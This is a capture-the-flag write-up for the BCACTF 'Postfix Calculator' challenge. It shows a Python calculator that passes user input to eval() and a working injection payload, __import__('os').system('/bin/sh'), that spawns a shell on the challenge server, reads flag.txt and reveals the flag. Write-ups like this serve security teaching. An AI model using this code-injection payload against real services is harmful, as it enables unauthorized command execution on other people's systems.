# Postfix Calculator

## Description
 
Postfix Calculator | 75  points | By `Parth`

Mr. Wang left some tricks behind in his Intro to CS labs before leaving BCA. Can you use the Postfix lab to get the flag?

Netcat Links:`nc  challs.bcactf.com 30096`<br>
Static resources: [PostfixCalculator.py](https://storage.googleapis.com/bcactf/postfix-calculator/PostfixCalculator.py)
 
## Analysis   

While the code is simple, its awfully not verbose and unclear what's happening.

I added `print` statements so we can see what we are doing.
```py
### Take inputs for required 2 nums and 1 operator ###
num = input("[-] Num 1: ")
num2 = input("[-] Num 2: ")
op = input("[-] Operator: ")

### Check if op is a valid operator ###
### If no, then raise error ###
if not op in ['+', '-', '*', '/', '^']:
    raise SyntaxError('Read token %s, expected operator' % op)
### Else, calculate new answer ###
print(f'\neval={num}{op}{num2}')
answer = eval(f'{num}{op}{num2}')
print(f"{answer=}\n")

num = input("[*] Num: ")
### Take inputs for more nums and operators ###
while num != '=':
    op = input("[*] Operator: ")
### If not '=' or invalid, then calculate new answer ###
    if not op in ['+', '-', '*', '/', '^']:
        raise SyntaxError('Read token %s, expected operator' % op)
    print(f"{answer} {op} {float(num)}")
    answer = eval(f'{answer} {op} {float(num)}')
    num = input("[*] Num: ")

### Output final answer ###
print(answer)
```

Okay, first part takes in `num1`, `num2` and `operator`. The first `eval` is not exploitable since it concatinates everything without spaces, but we can use that functionality to craft payload.

Second `eval` is where exploit will happen since our `answer` payload will get evaluated (notice spaces) and rest will get added.

I mention concatinate/add and by that I mean that I'll be using `+` as operator, since other operators can't benefit us in python. <br><small>Maybe `*` can but I'll stick to `+`</small>

```sh
└─$ py PostfixCalculator.py
[-] Num 1: "__import__('os').system('/bin/sh')"
[-] Num 2: ""
[-] Operator: +

eval="__import__('os').system('/bin/sh')"+""
answer="__import__('os').system('/bin/sh')"

[*] Num: 0
[*] Operator: +
payload=__import__('os').system('/bin/sh') + 0.0
$ whoami
kali
```

## Solution

```sh
➜ ncat challs.bcactf.com 30096
"__import__('os').system('/bin/sh')" # Num1
""                                   # Num2
+                                    # Operator1
0                                    # Loop num
+                                    # Loop operator
id                                   # Test shell
uid=12345(ctf) gid=12345(ctf) groups=12345(ctf)
ls                                   # Find flag
Dockerfile
PostfixCalculator.py
chall.yaml
flag.txt
solve.txt
ynetd
cat flag*                             # cat flag.txt
bcactf{L3@kY_fUNcT!0n5_178235}
```